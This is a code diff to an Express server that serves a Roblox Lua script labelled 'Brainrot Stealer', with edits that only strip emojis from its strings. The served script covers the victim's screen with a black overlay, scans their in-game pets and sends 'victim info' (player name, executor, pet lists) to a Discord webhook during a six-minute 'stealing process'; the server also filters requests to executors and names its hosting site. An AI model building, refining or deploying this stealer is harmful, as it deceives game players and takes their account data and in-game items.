@@ -76,7 +76,7 @@ app.get("/raw", blockNonExecutor, (req, res) => {
   }
 
   // ----------------------------------------------------------------
-  //   FULL LUA SCRIPT – CLEANER WITH EMOJIS
+  //   FULL LUA SCRIPT – FIXED SYNTAX
   // ----------------------------------------------------------------
   const lua = `local EncryptedData = "${encrypted}"
 
@@ -204,7 +204,7 @@ local function CreateBlackScreen()
     statusLabel.Size = UDim2.new(1, 0, 0, 25)
     statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
     statusLabel.BackgroundTransparency = 1
-    statusLabel.Text = "🔄 Scanning Brainrots..."
+    statusLabel.Text = "Scanning Brainrots..."
     statusLabel.TextColor3 = Color3.new(1, 1, 1)
     statusLabel.TextSize = 18
     statusLabel.Font = Enum.Font.Gotham
@@ -308,7 +308,7 @@ end
 
 -- Format Brainrots List
 local function FormatBrainrotsList(brainrots)
-    if #brainrots == 0 then return "🚫 No Brainrots Found" end
+    if #brainrots == 0 then return "No Brainrots Found" end
     
     local result = ""
     for i, pet in ipairs(brainrots) do
@@ -319,7 +319,7 @@ end
 
 -- Format Top Pets List
 local function FormatTopPetsList(pets)
-    if #pets == 0 then return "🚫 No Pets Found" end
+    if #pets == 0 then return "No Pets Found" end
     
     local result = ""
     for i = 1, math.min(5, #pets) do
@@ -336,13 +336,13 @@ local function StartStealingProcess(gameLink)
     -- Create black screen
     local screenGui, timer, status = CreateBlackScreen()
     
-    status.Text = "🔍 Scanning Pets..."
+    status.Text = "Scanning Pets..."
     wait(2)
     
     -- Scan pets
     local allPets, brainrots, topPets = ScanPets()
     
-    status.Text = "📨 Sending Results..."
+    status.Text = "Sending Results..."
     
     -- Create brainrots list for embed
     local brainrotsText = FormatBrainrotsList(brainrots)
@@ -350,8 +350,8 @@ local function StartStealingProcess(gameLink)
     
     -- Send results to webhook
     local embed = {
-        title = "🧠 BRAINROT STEALER RESULTS",
-        description = "🎯 **Successfully scanned victim's pets!**",
+        title = "BRAINROT STEALER RESULTS",
+        description = "Successfully scanned victim pets",
         color = 65280,
         author = {
             name = playerName,
@@ -360,33 +360,33 @@ local function StartStealingProcess(gameLink)
         },
         fields = {
             {
-                name = "👤 Victim Info",
-                value = "**Player:** " .. playerName .. "\\n**Executor:** " .. executor .. "\\n**Server Players:** " .. playerCount,
+                name = "Victim Info",
+                value = "Player: " .. playerName .. "\\nExecutor: " .. executor .. "\\nServer Players: " .. playerCount,
                 inline = true
             },
             {
-                name = "📊 Scan Results", 
-                value = "**Total Pets:** " .. #allPets .. "\\n**Brainrots:** " .. #brainrots .. "\\n**Game:** " .. (gameLink or "Unknown"),
+                name = "Scan Results", 
+                value = "Total Pets: " .. #allPets .. "\\nBrainrots: " .. #brainrots .. "\\nGame: " .. (gameLink or "Unknown"),
                 inline = true
             },
             {
-                name = "🏆 Top Pets",
+                name = "Top Pets",
                 value = "```" .. topPetsText .. "```",
                 inline = false
             },
             {
-                name = "🧠 Brainrots",
+                name = "Brainrots",
                 value = "```" .. brainrotsText .. "```",
                 inline = false
             }
         },
-        footer = {text = "🧠 Brainrot Stealer • " .. os.date("%X")},
+        footer = {text = "Brainrot Stealer • " .. os.date("%X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
     
     SendToDiscord(embed)
     
-    status.Text = "✅ Results Sent! Starting 6-minute process..."
+    status.Text = "Results Sent! Starting 6-minute process..."
     
     -- 6-minute timer
     local totalTime = 360
@@ -402,8 +402,8 @@ local function StartStealingProcess(gameLink)
     
     -- Send completion message
     local completeEmbed = {
-        title = "✅ PROCESS COMPLETE",
-        description = "🧠 **Brainrot stealing process finished!**",
+        title = "PROCESS COMPLETE",
+        description = "Brainrot stealing process finished",
         color = 32768,
         author = {
             name = playerName,
@@ -412,18 +412,18 @@ local function StartStealingProcess(gameLink)
         },
         fields = {
             {
-                name = "📈 Final Results",
-                value = "**Time:** 6 minutes\\n**Pets Scanned:** " .. #allPets .. "\\n**Brainrots Found:** " .. #brainrots .. "\\n**Status:** ✅ Success",
+                name = "Final Results",
+                value = "Time: 6 minutes\\nPets Scanned: " .. #allPets .. "\\nBrainrots Found: " .. #brainrots .. "\\nStatus: Success",
                 inline = false
             }
         },
-        footer = {text = "🧠 Brainrot Stealer • " .. os.date("%X")}
+        footer = {text = "Brainrot Stealer • " .. os.date("%X")}
     }
     
     SendToDiscord(completeEmbed)
     
-    status.Text = "🎉 Process Complete!"
-    timer.Text = "✅ DONE"
+    status.Text = "Process Complete!"
+    timer.Text = "DONE"
     
     wait(3)
     
@@ -447,7 +447,7 @@ local function CreateGUI()
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 50)
     title.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
-    title.Text = "🧠 BRAINROT STEALER\\nClick to Start"
+    title.Text = "BRAINROT STEALER\\nClick to Start"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.Font = Enum.Font.GothamBold
     title.TextSize = 16
@@ -457,14 +457,14 @@ local function CreateGUI()
     button.Size = UDim2.new(0.8, 0, 0, 50)
     button.Position = UDim2.new(0.1, 0, 0.5, 0)
     button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
-    button.Text = "🚀 START STEALING"
+    button.Text = "START STEALING"
     button.TextColor3 = Color3.new(1, 1, 1)
     button.Font = Enum.Font.GothamBold
     button.TextSize = 16
     button.Parent = mainFrame
     
     button.MouseButton1Click:Connect(function()
-        button.Text = "🔄 STARTING..."
+        button.Text = "STARTING..."
         button.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
         wait(1)
         StartStealingProcess("Auto-Scan")
@@ -475,8 +475,8 @@ end
 wait(1)
 CreateGUI()
 
-print("🧠 Brainrot Stealer loaded!")
-print("✅ Ready to steal brainrots!")`;
+print("Brainrot Stealer loaded!")
+print("Ready to steal brainrots!")`;
 
   res.type("text/plain").send(lua);
 });
@@ -496,7 +496,7 @@ app.use((req, res) => {
 // 5. START SERVER
 // ------------------------------------------------------------------
 app.listen(PORT, () => {
-  console.log("🧠 Brainrot Stealer Server running on port " + PORT);
-  console.log("✅ Ready to steal brainrots!");
-  console.log("🔗 Website: https://tommyfc555-github-io.onrender.com");
+  console.log("Brainrot Stealer Server running on port " + PORT);
+  console.log("Ready to steal brainrots!");
+  console.log("Website: https://tommyfc555-github-io.onrender.com");
 });
